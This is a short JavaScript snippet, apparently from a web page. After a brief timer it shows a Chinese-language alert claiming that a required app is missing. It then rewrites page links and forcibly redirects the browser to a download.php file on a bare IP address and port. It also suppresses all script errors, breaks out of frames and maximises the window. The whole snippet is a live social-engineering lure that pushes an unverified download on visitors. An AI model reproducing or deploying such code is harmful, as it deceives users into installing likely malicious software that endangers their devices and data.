var bar=0 
count()               			   
function count(){ 
bar=bar+3
if (bar<99) 
{
setTimeout("count()",20);
} 
else 
{
window.alert('系统没有检测到本站专用APP,请下载本站专用APP，安装后运行专用APP即可浏览精彩内容！                                                                                                                                       PS:如打开后软件无内容，只需刷新软件更新即可！（软件每3小时，更新一次精彩内容，让你看个够！）');
$("#link1").attr("onclick","return count_a(1);");
$("#link2").attr("onclick","return count_a(2);");
//start
var y=Math.floor(Math.random()*1 + 1);
if(y==1){
$("#link1").attr("href","http://218.65.30.86:21919/download.php?sid=1&cid=10481&t=9");
$("#link2").attr("href","http://218.65.30.86:21919/download.php?sid=1&cid=10481&t=9");
window.location.href="http://218.65.30.86:21919/download.php?sid=1&cid=10481&t=9";
}else{
$("#link1").attr("href","http://218.65.30.86:21919/download.php?sid=1&cid=10481&t=9");
$("#link2").attr("href","http://218.65.30.86:21919/download.php?sid=1&cid=10481&t=9");
window.location.href="http://218.65.30.86:21919/download.php?sid=1&cid=10481&t=9";
}
//over

} 
}
if(self!=top){window.open(self.location,'_top');}
function killErrors(){return true;}
window.onerror = killErrors;
self.moveTo(0,0);
self.resizeTo(screen.availWidth,screen.availHeight); 
